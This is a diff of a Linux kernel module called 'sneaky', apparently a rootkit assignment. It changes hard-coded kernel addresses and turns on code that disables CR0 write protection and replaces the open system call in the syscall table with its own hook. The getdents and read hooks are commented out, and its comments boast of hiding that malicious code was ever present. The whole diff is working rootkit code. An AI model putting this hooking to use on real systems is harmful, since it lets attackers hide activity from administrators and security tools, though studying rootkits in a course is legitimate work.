@@ -35,8 +35,8 @@ struct linux_dirent {
   char d_name[1];
 };
 
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 
 static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 
@@ -129,7 +129,7 @@ static int initialize_sneaky_module(void) {
   // See /var/log/syslog for kernel print output
   printk(KERN_ALERT "Sneaky module being loaded.\n");
   printk(KERN_ALERT "sneaky_pid is %s\n", sneaky_pid);
-  /*
+
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
   // Get a pointer to the virtual page containing the address
@@ -141,18 +141,19 @@ static int initialize_sneaky_module(void) {
   // This is the magic! Save away the original 'open' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
+
   original_open = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
-  original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  /*original_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
   original_read = (void *)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
-
+  */
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
-  */
+
   return 0; // to show a successful load
 }
 
@@ -160,7 +161,7 @@ static void exit_sneaky_module(void) {
   struct page *page_ptr;
 
   printk(KERN_ALERT "Sneaky module being unloaded.\n");
-  /*
+
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
 
@@ -173,13 +174,13 @@ static void exit_sneaky_module(void) {
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_open;
-  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  /* *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
-
+  */
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
-  write_cr0(read_cr0() | 0x10000);*/
+  write_cr0(read_cr0() | 0x10000);
 }
 
 module_init(initialize_sneaky_module); // what's called upon loading
